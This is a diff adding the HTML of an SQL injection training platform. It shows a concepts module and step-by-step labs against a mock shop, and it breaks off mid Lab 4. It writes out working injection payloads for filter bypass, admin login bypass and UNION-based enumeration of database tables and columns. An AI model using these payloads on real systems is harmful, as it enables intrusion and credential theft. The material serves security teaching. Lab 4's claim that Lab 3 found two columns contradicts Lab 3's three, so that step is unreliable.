+  <div class="sidebar-subtitle">SQL Injection Training Platform</div>
+
+  <nav class="sidebar-nav">
+    <div class="nav-section-label">FOUNDATION</div>
+    <button class="nav-item active" data-section="concept">
+      <span class="nav-icon">⬡</span> SQL Injection Concepts
+    </button>
+
+    <div class="nav-section-label">LABS</div>
+    <button class="nav-item" data-section="lab1">
+      <span class="nav-icon">▸</span> Lab 1 — WHERE Clause
+      <span class="nav-tag">BEGINNER</span>
+    </button>
+    <button class="nav-item" data-section="lab2">
+      <span class="nav-icon">▸</span> Lab 2 — Login Bypass
+      <span class="nav-tag">BEGINNER</span>
+    </button>
+    <button class="nav-item" data-section="lab3">
+      <span class="nav-icon">▸</span> Lab 3 — UNION Discovery
+      <span class="nav-tag">MEDIUM</span>
+    </button>
+    <button class="nav-item" data-section="lab4">
+      <span class="nav-icon">▸</span> Lab 4 — Data Extraction
+      <span class="nav-tag tag-hard">ADVANCED</span>
+    </button>
+
+    <div class="nav-section-label">DEFENSE</div>
+    <button class="nav-item" data-section="prevention">
+      <span class="nav-icon">🛡</span> Prevention Guide
+    </button>
+  </nav>
+
+  <div class="sidebar-footer">
+    <div class="progress-label">Lab Progress</div>
+    <div class="progress-bar-wrap"><div class="progress-bar" id="progressBar"></div></div>
+    <div class="progress-text" id="progressText">0 / 4 Labs Completed</div>
+  </div>
+</aside>
+
+<!-- HAMBURGER -->
+<button class="hamburger" id="hamburger">☰</button>
+
+<!-- MAIN CONTENT -->
+<main class="main-content" id="mainContent">
+
+  <!-- ===================== SECTION: CONCEPT ===================== -->
+  <section id="section-concept" class="section active">
+    <div class="section-header">
+      <div class="section-tag">FOUNDATION MODULE</div>
+      <h1>SQL Injection — Core Concepts</h1>
+      <p class="section-desc">Before exploiting, you must understand. This module teaches you how SQL works, why injections happen, and how attackers think.</p>
+    </div>
+
+    <div class="card-grid">
+
+      <div class="card">
+        <div class="card-icon">🗄</div>
+        <h3>What is SQL?</h3>
+        <p>Databases store data in tables. SQL (Structured Query Language) is used to read and write that data.</p>
+        <div class="code-block">
+          <div class="code-label">EXAMPLE QUERY</div>
+          <pre><span class="sql-keyword">SELECT</span> * <span class="sql-keyword">FROM</span> users
+<span class="sql-keyword">WHERE</span> username = <span class="sql-string">'admin'</span>;</pre>
+        </div>
+        <p class="card-note">This query fetches the user whose username is <code>admin</code> from the users table.</p>
+      </div>
+
+      <div class="card">
+        <div class="card-icon">⚠️</div>
+        <h3>The Vulnerability</h3>
+        <p>When user input is directly inserted into a SQL query <strong>without validation</strong>, the attacker can inject SQL code and change the query's logic.</p>
+        <div class="flow-arrow-box">
+          <div class="flow-step bad">User Input (Malicious)</div>
+          <div class="flow-arrow">→</div>
+          <div class="flow-step bad">Injected SQL Query</div>
+          <div class="flow-arrow">→</div>
+          <div class="flow-step bad">Unintended Database Response</div>
+        </div>
+      </div>
+
+      <div class="card card-wide">
+        <div class="card-icon">🧪</div>
+        <h3>How Injection Changes a Query</h3>
+        <div class="query-compare">
+          <div class="query-box">
+            <div class="query-label good-label">✅ NORMAL INPUT</div>
+            <div class="code-block">
+              <pre><span class="sql-keyword">SELECT</span> * <span class="sql-keyword">FROM</span> products
+<span class="sql-keyword">WHERE</span> category = <span class="sql-string">'Gifts'</span>
+  <span class="sql-keyword">AND</span> released = <span class="sql-number">1</span>;</pre>
+            </div>
+            <p>Shows only released Gifts products. Normal behaviour.</p>
+          </div>
+          <div class="query-arrow">⟹</div>
+          <div class="query-box">
+            <div class="query-label bad-label">💀 INJECTED INPUT</div>
+            <div class="code-block">
+              <pre><span class="sql-keyword">SELECT</span> * <span class="sql-keyword">FROM</span> products
+<span class="sql-keyword">WHERE</span> category = <span class="sql-string">'Gifts'</span>
+  <span class="sql-keyword">OR</span> <span class="sql-inject">1=1</span><span class="sql-comment">--</span><span class="sql-faded">' AND released = 1;</span></pre>
+            </div>
+            <p><code class="inline-code">'</code> closes the string · <code class="inline-code">OR 1=1</code> is always TRUE · <code class="inline-code">--</code> kills the rest</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-icon">🔑</div>
+        <h3>The SQL Comment Trick</h3>
+        <p>In SQL, <code>--</code> marks the beginning of a comment. Everything after it is ignored by the database engine.</p>
+        <div class="code-block">
+          <pre><span class="sql-keyword">WHERE</span> username = <span class="sql-string">'admin'</span><span class="sql-comment">--</span>
+<span class="sql-faded">AND password = 'anything';</span></pre>
+        </div>
+        <p class="card-note">The password check never runs. Authentication is bypassed.</p>
+      </div>
+
+      <div class="card">
+        <div class="card-icon">📚</div>
+        <h3>Types of SQL Injection</h3>
+        <div class="type-list">
+          <div class="type-item">
+            <span class="type-badge">Error-based</span>
+            <span>Extracts data via database error messages</span>
+          </div>
+          <div class="type-item">
+            <span class="type-badge">UNION-based</span>
+            <span>Appends extra SELECT to retrieve other table data</span>
+          </div>
+          <div class="type-item">
+            <span class="type-badge">Boolean-based</span>
+            <span>Asks TRUE/FALSE questions to extract data bit by bit</span>
+          </div>
+          <div class="type-item">
+            <span class="type-badge">Auth Bypass</span>
+            <span>Manipulates login queries to skip password checks</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-icon">🌍</div>
+        <h3>Real-World Impact</h3>
+        <div class="impact-list">
+          <div class="impact-item"><span class="impact-icon">💾</span> Full database dump</div>
+          <div class="impact-item"><span class="impact-icon">🔓</span> Admin account takeover</div>
+          <div class="impact-item"><span class="impact-icon">📧</span> Customer data exposure</div>
+          <div class="impact-item"><span class="impact-icon">💳</span> Financial record leakage</div>
+          <div class="impact-item"><span class="impact-icon">🏦</span> Credential theft</div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="flow-diagram-wrap">
+      <h3>Attack Flow Visualisation</h3>
+      <div class="attack-flow">
+        <div class="af-step"><div class="af-icon">👤</div><div class="af-label">Attacker</div><div class="af-sub">crafts malicious input</div></div>
+        <div class="af-arrow">→</div>
+        <div class="af-step"><div class="af-icon">🌐</div><div class="af-label">Web App</div><div class="af-sub">inserts input into query</div></div>
+        <div class="af-arrow">→</div>
+        <div class="af-step"><div class="af-icon">🗄</div><div class="af-label">Database</div><div class="af-sub">executes modified query</div></div>
+        <div class="af-arrow">→</div>
+        <div class="af-step af-danger"><div class="af-icon">💀</div><div class="af-label">Breach</div><div class="af-sub">data returned to attacker</div></div>
+      </div>
+    </div>
+
+    <div class="cta-banner">
+      <p>You understand the theory. Now it's time to exploit.</p>
+      <button class="cta-btn" onclick="showSection('lab1')">Start Lab 1 →</button>
+    </div>
+  </section>
+
+  <!-- ===================== SECTION: LAB 1 ===================== -->
+  <section id="section-lab1" class="section">
+    <div class="section-header">
+      <div class="section-tag">LAB 1 · WHERE CLAUSE</div>
+      <h1>Retrieving Hidden Data</h1>
+      <p class="section-desc">The application filters products using a SQL WHERE clause. By injecting into the category parameter, you will bypass the <code>released = 1</code> filter and expose all hidden products.</p>
+    </div>
+
+    <div class="lab-layout">
+      <div class="lab-steps-panel">
+        <div class="step-timeline" id="lab1-steps">
+
+          <div class="step-item active" data-step="0">
+            <div class="step-dot"></div>
+            <div class="step-content">
+              <div class="step-num">STEP 1</div>
+              <div class="step-title">Identify the Injection Point</div>
+              <p>When you click the <strong>Gifts</strong> category, the browser sends a request with this URL:</p>
+              <div class="fake-browser">
+                <div class="browser-bar">
+                  <span class="browser-dot r"></span><span class="browser-dot y"></span><span class="browser-dot g"></span>
+                  <div class="browser-url" id="lab1-url">https://shop.example.net/filter?category=Gifts</div>
+                </div>
+                <div class="browser-body">
+                  <div class="product-grid" id="lab1-products-display">
+                    <div class="fake-product"><div class="fp-img"></div><div class="fp-name">Gift Box Premium</div><div class="fp-price">£29.99</div></div>
+                    <div class="fake-product"><div class="fp-img" style="background:#2a4040"></div><div class="fp-name">Luxury Candle Set</div><div class="fp-price">£44.99</div></div>
+                    <div class="fake-product"><div class="fp-img" style="background:#3a2a40"></div><div class="fp-name">Photo Frame Gold</div><div class="fp-price">£19.99</div></div>
+                  </div>
+                </div>
+              </div>
+              <button class="step-btn" onclick="lab1Step(1)">Next: Understand the Query →</button>
+            </div>
+          </div>
+
+          <div class="step-item" data-step="1">
+            <div class="step-dot"></div>
+            <div class="step-content">
+              <div class="step-num">STEP 2</div>
+              <div class="step-title">Understand the Backend SQL Query</div>
+              <p>The <code>category</code> parameter is directly inserted into this SQL query:</p>
+              <div class="code-block animated-query" id="lab1-query-normal">
+                <div class="code-label">BACKEND SQL (NORMAL)</div>
+                <pre><span class="sql-keyword">SELECT</span> * <span class="sql-keyword">FROM</span> products
+<span class="sql-keyword">WHERE</span> category = <span class="sql-string">'Gifts'</span>
+  <span class="sql-keyword">AND</span> released = <span class="sql-number">1</span>;</pre>
+              </div>
+              <div class="info-box">
+                <strong>Key insight:</strong> <code>released = 1</code> hides unreleased products. The string <code>'Gifts'</code> comes directly from user input — it is NOT sanitised.
+              </div>
+              <button class="step-btn" onclick="lab1Step(2)">Next: Craft Payload →</button>
+            </div>
+          </div>
+
+          <div class="step-item" data-step="2">
+            <div class="step-dot"></div>
+            <div class="step-content">
+              <div class="step-num">STEP 3</div>
+              <div class="step-title">Craft the Injection Payload</div>
+              <p>The goal: make OR condition always TRUE and comment out the released filter.</p>
+              <div class="payload-builder">
+                <div class="payload-part p-quote" title="Closes the 'Gifts' string">
+                  <div class="pp-char">'</div><div class="pp-label">Close string</div>
+                </div>
+                <div class="payload-part p-or" title="Always evaluates to TRUE">
+                  <div class="pp-char">OR 1=1</div><div class="pp-label">Always TRUE</div>
+                </div>
+                <div class="payload-part p-comment" title="Comments out the rest">
+                  <div class="pp-char">--</div><div class="pp-label">Comment out rest</div>
+                </div>
+              </div>
+              <div class="code-block">
+                <div class="code-label">FULL PAYLOAD</div>
+                <pre>'+OR+1=1--</pre>
+              </div>
+              <div class="info-box warning-box">
+                <strong>Why <code>+</code> signs?</strong> In URLs, spaces are encoded as <code>+</code>. Burp Suite handles this automatically.
+              </div>
+              <button class="step-btn" onclick="lab1Step(3)">Next: Inject & Observe →</button>
+            </div>
+          </div>
+
+          <div class="step-item" data-step="3">
+            <div class="step-dot"></div>
+            <div class="step-content">
+              <div class="step-num">STEP 4</div>
+              <div class="step-title">Inject the Payload</div>
+              <p>Try it yourself. Modify the URL below to inject the payload:</p>
+              <div class="fake-browser">
+                <div class="browser-bar">
+                  <span class="browser-dot r"></span><span class="browser-dot y"></span><span class="browser-dot g"></span>
+                  <input class="browser-url-input" id="lab1-inject-input" type="text" value="https://shop.example.net/filter?category=Gifts" placeholder="Modify the URL here..."/>
+                </div>
+                <div class="browser-body" id="lab1-inject-response">
+                  <div class="terminal-idle">Waiting for request…</div>
+                </div>
+              </div>
+              <button class="step-btn" onclick="lab1Inject()">Send Request</button>
+              <button class="step-btn hint-btn" onclick="lab1Hint()">💡 Show Hint</button>
+              <div class="hint-box" id="lab1-hint" style="display:none;">
+                Try: <code>https://shop.example.net/filter?category=Gifts'+OR+1=1--</code>
+              </div>
+            </div>
+          </div>
+
+          <div class="step-item" data-step="4">
+            <div class="step-dot"></div>
+            <div class="step-content">
+              <div class="step-num">STEP 5</div>
+              <div class="step-title">Query Transformation</div>
+              <p>See exactly what happened to the SQL query after your injection:</p>
+              <div class="query-compare">
+                <div class="query-box">
+                  <div class="query-label good-label">BEFORE</div>
+                  <div class="code-block">
+                    <pre><span class="sql-keyword">SELECT</span> * <span class="sql-keyword">FROM</span> products
+<span class="sql-keyword">WHERE</span> category = <span class="sql-string">'Gifts'</span>
+  <span class="sql-keyword">AND</span> released = <span class="sql-number">1</span>;</pre>
+                  </div>
+                </div>
+                <div class="query-arrow">⟹</div>
+                <div class="query-box">
+                  <div class="query-label bad-label">AFTER INJECTION</div>
+                  <div class="code-block">
+                    <pre><span class="sql-keyword">SELECT</span> * <span class="sql-keyword">FROM</span> products
+<span class="sql-keyword">WHERE</span> category = <span class="sql-string">'Gifts'</span>
+  <span class="sql-keyword">OR</span> <span class="sql-inject">1=1</span><span class="sql-comment">--</span>
+<span class="sql-faded">  AND released = 1;</span></pre>
+                  </div>
+                </div>
+              </div>
+              <button class="step-btn" onclick="lab1Step(5)">Next: Knowledge Check →</button>
+            </div>
+          </div>
+
+          <div class="step-item" data-step="5">
+            <div class="step-dot"></div>
+            <div class="step-content">
+              <div class="step-num">KNOWLEDGE CHECK</div>
+              <div class="step-title">Test Your Understanding</div>
+              <div class="quiz-container" id="lab1-quiz">
+                <div class="quiz-q">What does <code>OR 1=1</code> do in the injected query?</div>
+                <div class="quiz-options">
+                  <button class="quiz-opt" onclick="lab1Quiz(this, true)">Makes the WHERE condition always TRUE, returning all rows</button>
+                  <button class="quiz-opt" onclick="lab1Quiz(this, false)">Encrypts the query for security</button>
+                  <button class="quiz-opt" onclick="lab1Quiz(this, false)">Selects only the first row</button>
+                  <button class="quiz-opt" onclick="lab1Quiz(this, false)">Deletes the products table</button>
+                </div>
+                <div class="quiz-result" id="lab1-quiz-result"></div>
+              </div>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+      <div class="lab-info-panel">
+        <div class="info-card">
+          <div class="info-card-title">🎯 Objective</div>
+          <p>Retrieve ALL products including unreleased ones by injecting into the category filter.</p>
+        </div>
+        <div class="info-card">
+          <div class="info-card-title">🔍 Injection Point</div>
+          <div class="code-block"><pre>?category=<span class="sql-inject">Gifts</span></pre></div>
+        </div>
+        <div class="info-card">
+          <div class="info-card-title">💉 Payload</div>
+          <div class="code-block"><pre>'+OR+1=1--</pre></div>
+        </div>
+        <div class="info-card">
+          <div class="info-card-title">🌍 Real-World Impact</div>
+          <ul class="impact-ul">
+            <li>Hidden product exposure</li>
+            <li>Unreleased data leakage</li>
+            <li>Bypassing business logic</li>
+          </ul>
+        </div>
+        <div class="lab-complete-badge" id="lab1-badge" style="display:none;">
+          <div class="badge-icon">🏆</div>
+          <div class="badge-text">Lab 1 Complete!</div>
+        </div>
+      </div>
+    </div>
+
+  </section>
+
+  <!-- ===================== SECTION: LAB 2 ===================== -->
+  <section id="section-lab2" class="section">
+    <div class="section-header">
+      <div class="section-tag">LAB 2 · LOGIN BYPASS</div>
+      <h1>Authentication Bypass via SQL Injection</h1>
+      <p class="section-desc">The login form passes credentials directly into a SQL query. You will inject into the username field to bypass the password check entirely and log in as <code>administrator</code>.</p>
+    </div>
+
+    <div class="lab-layout">
+      <div class="lab-steps-panel">
+        <div class="step-timeline" id="lab2-steps">
+
+          <div class="step-item active" data-step="0">
+            <div class="step-dot"></div>
+            <div class="step-content">
+              <div class="step-num">STEP 1</div>
+              <div class="step-title">Understand the Login Query</div>
+              <p>When you submit the login form, the server builds this query:</p>
+              <div class="code-block">
+                <div class="code-label">BACKEND SQL (NORMAL LOGIN)</div>
+                <pre><span class="sql-keyword">SELECT</span> * <span class="sql-keyword">FROM</span> users
+<span class="sql-keyword">WHERE</span> username = <span class="sql-string">'administrator'</span>
+  <span class="sql-keyword">AND</span> password = <span class="sql-string">'correct_password'</span>;</pre>
+              </div>
+              <div class="info-box">
+                <strong>If this query returns a row</strong>, login succeeds. Both fields must match. But what if we comment out the password check?
+              </div>
+              <button class="step-btn" onclick="lab2Step(1)">Next: Craft Payload →</button>
+            </div>
+          </div>
+
+          <div class="step-item" data-step="1">
+            <div class="step-dot"></div>
+            <div class="step-content">
+              <div class="step-num">STEP 2</div>
+              <div class="step-title">Craft the Bypass Payload</div>
+              <div class="payload-builder">
+                <div class="payload-part p-string">
+                  <div class="pp-char">administrator</div><div class="pp-label">Valid username</div>
+                </div>
+                <div class="payload-part p-quote">
+                  <div class="pp-char">'</div><div class="pp-label">Close string</div>
+                </div>
+                <div class="payload-part p-comment">
+                  <div class="pp-char">--</div><div class="pp-label">Kill password check</div>
+                </div>
+              </div>
+              <div class="code-block">
+                <div class="code-label">USERNAME FIELD PAYLOAD</div>
+                <pre>administrator<span class="sql-inject">'</span> <span class="sql-comment">--</span></pre>
+              </div>
+              <div class="info-box warning-box">
+                <strong>Password field:</strong> Enter anything (e.g., <code>test123</code>). Client-side JS prevents empty forms, but the value doesn't matter once our injection removes the check.
+              </div>
+              <button class="step-btn" onclick="lab2Step(2)">Next: Try the Login →</button>
+            </div>
+          </div>
+
+          <div class="step-item" data-step="2">
+            <div class="step-dot"></div>
+            <div class="step-content">
+              <div class="step-num">STEP 3</div>
+              <div class="step-title">Attempt Login</div>
+              <div class="fake-login-form" id="lab2-login">
+                <div class="login-title">🔐 My Account</div>
+                <div class="form-group">
+                  <label>Username</label>
+                  <input type="text" id="lab2-username" class="fake-input" placeholder="Enter username...">
+                </div>
+                <div class="form-group">
+                  <label>Password</label>
+                  <input type="password" id="lab2-password" class="fake-input" placeholder="Enter password...">
+                </div>
+                <button class="login-btn" onclick="lab2Login()">Log In</button>
+                <div class="login-result" id="lab2-result"></div>
+              </div>
+              <button class="step-btn hint-btn" onclick="lab2Hint()">💡 Show Payload Hint</button>
+              <div class="hint-box" id="lab2-hint" style="display:none;">
+                Username: <code>administrator'--</code>&nbsp;&nbsp; Password: <code>anything</code>
+              </div>
+            </div>
+          </div>
+
+          <div class="step-item" data-step="3">
+            <div class="step-dot"></div>
+            <div class="step-content">
+              <div class="step-num">STEP 4</div>
+              <div class="step-title">Query Transformation</div>
+              <div class="query-compare">
+                <div class="query-box">
+                  <div class="query-label good-label">NORMAL LOGIN</div>
+                  <div class="code-block">
+                    <pre><span class="sql-keyword">WHERE</span> username = <span class="sql-string">'administrator'</span>
+  <span class="sql-keyword">AND</span> password = <span class="sql-string">'correct_pass'</span>;</pre>
+                  </div>
+                </div>
+                <div class="query-arrow">⟹</div>
+                <div class="query-box">
+                  <div class="query-label bad-label">AFTER INJECTION</div>
+                  <div class="code-block">
+                    <pre><span class="sql-keyword">WHERE</span> username = <span class="sql-string">'administrator'</span><span class="sql-comment">--</span>
+<span class="sql-faded">  AND password = 'test123';</span></pre>
+                  </div>
+                </div>
+              </div>
+              <div class="info-box">
+                The password condition is <strong>completely removed</strong>. The database only checks if a user named <code>administrator</code> exists — which it does. Login succeeds.
+              </div>
+              <button class="step-btn" onclick="lab2Step(4)">Next: Knowledge Check →</button>
+            </div>
+          </div>
+
+          <div class="step-item" data-step="4">
+            <div class="step-dot"></div>
+            <div class="step-content">
+              <div class="step-num">KNOWLEDGE CHECK</div>
+              <div class="step-title">Test Your Understanding</div>
+              <div class="quiz-container">
+                <div class="quiz-q">Why does entering anything in the password field still result in successful login?</div>
+                <div class="quiz-options">
+                  <button class="quiz-opt" onclick="lab2Quiz(this, false)">The system accepts weak passwords</button>
+                  <button class="quiz-opt" onclick="lab2Quiz(this, true)">The <code>--</code> comments out the password check before it reaches the DB</button>
+                  <button class="quiz-opt" onclick="lab2Quiz(this, false)">The password is hashed and matches</button>
+                  <button class="quiz-opt" onclick="lab2Quiz(this, false)">The username overrides password requirements</button>
+                </div>
+                <div class="quiz-result" id="lab2-quiz-result"></div>
+              </div>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+      <div class="lab-info-panel">
+        <div class="info-card">
+          <div class="info-card-title">🎯 Objective</div>
+          <p>Log in as <code>administrator</code> without knowing the password.</p>
+        </div>
+        <div class="info-card">
+          <div class="info-card-title">🔍 Injection Point</div>
+          <p>Login form <strong>username</strong> field</p>
+        </div>
+        <div class="info-card">
+          <div class="info-card-title">💉 Payload</div>
+          <div class="code-block"><pre>administrator'--</pre></div>
+        </div>
+        <div class="info-card">
+          <div class="info-card-title">🌍 Real-World Impact</div>
+          <ul class="impact-ul">
+            <li>Full admin access without credentials</li>
+            <li>No brute force required</li>
+            <li>Complete account takeover</li>
+          </ul>
+        </div>
+        <div class="lab-complete-badge" id="lab2-badge" style="display:none;">
+          <div class="badge-icon">🏆</div>
+          <div class="badge-text">Lab 2 Complete!</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===================== SECTION: LAB 3 ===================== -->
+  <section id="section-lab3" class="section">
+    <div class="section-header">
+      <div class="section-tag">LAB 3 · UNION ATTACK</div>
+      <h1>Column Discovery via UNION SELECT</h1>
+      <p class="section-desc">To extract data from other tables using UNION, you must first know the exact number of columns and which columns accept text. This lab teaches you how.</p>
+    </div>
+
+    <div class="lab-layout">
+      <div class="lab-steps-panel">
+        <div class="step-timeline">
+
+          <div class="step-item active">
+            <div class="step-dot"></div>
+            <div class="step-content">
+              <div class="step-num">STEP 1</div>
+              <div class="step-title">Confirm SQL Injection Exists</div>
+              <p>First, test if the parameter is injectable by sending a single quote:</p>
+              <div class="code-block">
+                <div class="code-label">TEST PAYLOAD</div>
+                <pre>/filter?category=Pets<span class="sql-inject">'</span></pre>
+              </div>
+              <div class="response-box">
+                <div class="resp-label">SERVER RESPONSE</div>
+                <div class="resp-body error">500 Internal Server Error — You've broken the SQL syntax. <strong>Injection confirmed.</strong></div>
+              </div>
+              <button class="step-btn" onclick="lab3Step(1)">Next: Count Columns →</button>
+            </div>
+          </div>
+
+          <div class="step-item" data-step="1">
+            <div class="step-dot"></div>
+            <div class="step-content">
+              <div class="step-num">STEP 2</div>
+              <div class="step-title">Determine Column Count</div>
+              <p>A UNION query must return the <strong>exact same number of columns</strong> as the original query. We test incrementally with NULLs:</p>
+
+              <div class="column-tester">
+                <div class="ct-row">
+                  <div class="ct-payload"><code>' UNION SELECT NULL --</code></div>
+                  <div class="ct-result error-result">❌ 500 Error (1 column — wrong)</div>
+                </div>
+                <div class="ct-row">
+                  <div class="ct-payload"><code>' UNION SELECT NULL, NULL --</code></div>
+                  <div class="ct-result error-result">❌ 500 Error (2 columns — wrong)</div>
+                </div>
+                <div class="ct-row success-row">
+                  <div class="ct-payload"><code>' UNION SELECT NULL, NULL, NULL --</code></div>
+                  <div class="ct-result success-result">✅ 200 OK — 3 columns confirmed!</div>
+                </div>
+              </div>
+
+              <div class="info-box">
+                <strong>Why NULL?</strong> NULL is compatible with any data type, so it won't cause type mismatch errors while we're just counting columns.
+              </div>
+              <button class="step-btn" onclick="lab3Step(2)">Next: Find Text Column →</button>
+            </div>
+          </div>
+
+          <div class="step-item" data-step="2">
+            <div class="step-dot"></div>
+            <div class="step-content">
+              <div class="step-num">STEP 3</div>
+              <div class="step-title">Identify Text-Compatible Column</div>
+              <p>Now swap each NULL for a string to find which columns can display text data:</p>
+              <div class="column-tester">
+                <div class="ct-row">
+                  <div class="ct-payload"><code>' UNION SELECT 'test', NULL, NULL --</code></div>
+                  <div class="ct-result error-result">❌ 500 Error — Column 1 is numeric</div>
+                </div>
+                <div class="ct-row success-row">
+                  <div class="ct-payload"><code>' UNION SELECT NULL, 'test', NULL --</code></div>
+                  <div class="ct-result success-result">✅ String 'test' appears on page!</div>
+                </div>
+              </div>
+              <div class="info-box">
+                <strong>Column 2 is our text column.</strong> We can now inject string data (like usernames and passwords) through column 2 and have it displayed on the page.
+              </div>
+              <button class="step-btn" onclick="lab3Step(3)">Next: Interactive Test →</button>
+            </div>
+          </div>
+
+          <div class="step-item" data-step="3">
+            <div class="step-dot"></div>
+            <div class="step-content">
+              <div class="step-num">STEP 4 — INTERACTIVE</div>
+              <div class="step-title">Test Column Discovery Yourself</div>
+              <p>Select a payload and observe the server response:</p>
+              <div class="payload-selector">
+                <select id="lab3-payload-select" class="payload-select">
+                  <option value="none">-- Select a payload --</option>
+                  <option value="1null">'+UNION+SELECT+NULL--</option>
+                  <option value="2null">'+UNION+SELECT+NULL,NULL--</option>
+                  <option value="3null">'+UNION+SELECT+NULL,NULL,NULL--</option>
+                  <option value="col1">'+UNION+SELECT+'test',NULL,NULL--</option>
+                  <option value="col2">'+UNION+SELECT+NULL,'test',NULL--</option>
+                  <option value="col3">'+UNION+SELECT+NULL,NULL,'test'--</option>
+                </select>
+                <button class="step-btn" style="margin-top:10px" onclick="lab3Test()">Send →</button>
+              </div>
+              <div class="terminal-output" id="lab3-output">
+                <div class="terminal-idle">Awaiting payload…</div>
+              </div>
+              <button class="step-btn" onclick="lab3Step(4)" style="margin-top:15px">Next: Knowledge Check →</button>
+            </div>
+          </div>
+
+          <div class="step-item" data-step="4">
+            <div class="step-dot"></div>
+            <div class="step-content">
+              <div class="step-num">KNOWLEDGE CHECK</div>
+              <div class="step-title">Test Your Understanding</div>
+              <div class="quiz-container">
+                <div class="quiz-q">Why must a UNION query return the same number of columns as the original?</div>
+                <div class="quiz-options">
+                  <button class="quiz-opt" onclick="lab3Quiz(this, false)">It's a web server rule, not a SQL rule</button>
+                  <button class="quiz-opt" onclick="lab3Quiz(this, true)">SQL requires both SELECT statements in a UNION to have matching column counts and compatible types</button>
+                  <button class="quiz-opt" onclick="lab3Quiz(this, false)">More columns slow down the query</button>
+                  <button class="quiz-opt" onclick="lab3Quiz(this, false)">The browser requires matching columns to render HTML</button>
+                </div>
+                <div class="quiz-result" id="lab3-quiz-result"></div>
+              </div>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+      <div class="lab-info-panel">
+        <div class="info-card">
+          <div class="info-card-title">🎯 Objective</div>
+          <p>Find the number of columns and which column accepts string data.</p>
+        </div>
+        <div class="info-card">
+          <div class="info-card-title">⚙️ Technique</div>
+          <p><strong>UNION SELECT</strong> — appends a second query to the original. Results are combined and returned together.</p>
+        </div>
+        <div class="info-card">
+          <div class="info-card-title">📐 Key Rules</div>
+          <ul class="impact-ul">
+            <li>Column count must match exactly</li>
+            <li>Data types must be compatible</li>
+            <li>NULL works as universal placeholder</li>
+          </ul>
+        </div>
+        <div class="lab-complete-badge" id="lab3-badge" style="display:none;">
+          <div class="badge-icon">🏆</div>
+          <div class="badge-text">Lab 3 Complete!</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===================== SECTION: LAB 4 ===================== -->
+  <section id="section-lab4" class="section">
+    <div class="section-header">
+      <div class="section-tag">LAB 4 · DATA EXTRACTION</div>
+      <h1>Full Database Compromise via UNION Attack</h1>
+      <p class="section-desc">The full attack chain: confirm injection → find columns → identify DB type → enumerate tables → extract credentials → log in as admin. This is how real breaches happen.</p>
+    </div>
+
+    <div class="lab-layout">
+      <div class="lab-steps-panel">
+
+        <div class="attack-chain-visual">
+          <div class="ac-step done" id="ac1"><span>1</span><br>Confirm SQLi</div>
+          <div class="ac-line"></div>
+          <div class="ac-step" id="ac2"><span>2</span><br>Find Columns</div>
+          <div class="ac-line"></div>
+          <div class="ac-step" id="ac3"><span>3</span><br>Identify DB</div>
+          <div class="ac-line"></div>
+          <div class="ac-step" id="ac4"><span>4</span><br>List Tables</div>
+          <div class="ac-line"></div>
+          <div class="ac-step" id="ac5"><span>5</span><br>List Columns</div>
+          <div class="ac-line"></div>
+          <div class="ac-step" id="ac6"><span>6</span><br>Dump Credentials</div>
+        </div>
+
+        <div class="step-timeline">
+
+          <div class="step-item active">
+            <div class="step-dot"></div>
+            <div class="step-content">
+              <div class="step-num">STEP 1 + 2</div>
+              <div class="step-title">Confirm Injection & Find Columns</div>
+              <p>From Lab 3 we already know: <strong>2 columns</strong>, both support text.</p>
+              <div class="code-block">
+                <pre><span class="sql-keyword">' UNION SELECT</span> <span class="sql-string">'test1'</span>, <span class="sql-string">'test2'</span> <span class="sql-comment">--</span></pre>
+              </div>
+              <div class="response-box">
+                <div class="resp-label">RESPONSE</div>
+                <div class="resp-body success">✅ 200 OK — Both strings displayed. 2 text-compatible columns.</div>
+              </div>
+              <button class="step-btn" onclick="lab4Step(1)">Next: Identify Database →</button>
+            </div>
+          </div>
+
+          <div class="step-item" data-step="1">
+            <div class="step-dot"></div>
+            <div class="step-content">
+              <div class="step-num">STEP 3</div>
+              <div class="step-title">Identify the Database Type</div>
+              <p>Different databases have different syntax. We call <code>version()</code> to fingerprint:</p>
+              <div class="code-block">
+                <div class="code-label">PAYLOAD</div>
+                <pre><span class="sql-keyword">' UNION SELECT</span> <span class="sql-function">version()</span>, <span class="sql-string">'test'</span> <span class="sql-comment">--</span></pre>
+              </div>
+              <div class="response-box">
+                <div class="resp-label">RESPONSE (RENDERED ON PAGE)</div>
+                <div class="resp-body success">PostgreSQL 14.2 on x86_64-pc-linux-gnu</div>
+              </div>
+              <div class="info-box">
+                <strong>It's PostgreSQL!</strong> This tells us to use PostgreSQL-specific syntax for the next steps. Different DBs use different functions and schemas.
+              </div>
+              <button class="step-btn" onclick="lab4Step(2)">Next: Find Tables →</button>
+            </div>
+          </div>
+
+          <div class="step-item" data-step="2">
+            <div class="step-dot"></div>
+            <div class="step-content">
+              <div class="step-num">STEP 4</div>
+              <div class="step-title">Enumerate All Tables</div>
+              <p><code>information_schema</code> is a built-in SQL schema that acts as a <strong>metadata dictionary</strong> — it describes the structure of the database itself.</p>
+              <div class="code-block">
+                <div class="code-label">PAYLOAD</div>
+                <pre><span class="sql-keyword">' UNION SELECT</span> table_name, <span class="sql-keyword">NULL</span>
+<span class="sql-keyword">FROM</span> information_schema.tables <span class="sql-comment">--</span></pre>
+              </div>
+              <div class="response-box">
+                <div class="resp-label">TABLES RETURNED</div>
+                <div class="resp-body success">pg_catalog.pg_type<br>pg_catalog.pg_user<br>public.<strong>users</strong><br>public.products<br>…</div>
+              </div>
+              <div class="info-box warning-box">
+                🎯 <strong>Found it:</strong> The <code>users</code> table exists. This is our target.
+              </div>
+              <button class="step-btn" onclick="lab4Step(3)">Next: List Columns →</button>
+            </div>
+          </div>
+
+          <div class="step-item" data-step="3">
+            <div class="step-dot"></div>
+            <div class="step-content">
+              <div class="step-num">STEP 5</div>
+              <div class="step-title">Enumerate Columns in users Table</div>
+              <div class="code-block">
+                <div class="code-label">PAYLOAD</div>
+                <pre><span class="sql-keyword">' UNION SELECT</span> column_name, <span class="sql-keyword">NULL</span>
+<span class="sql-keyword">FROM</span> information_schema.columns
+<span class="sql-keyword">WHERE</span> table_name = <span class="sql-string">'users'</span> <span class="sql-comment">--</span></pre>
+              </div>
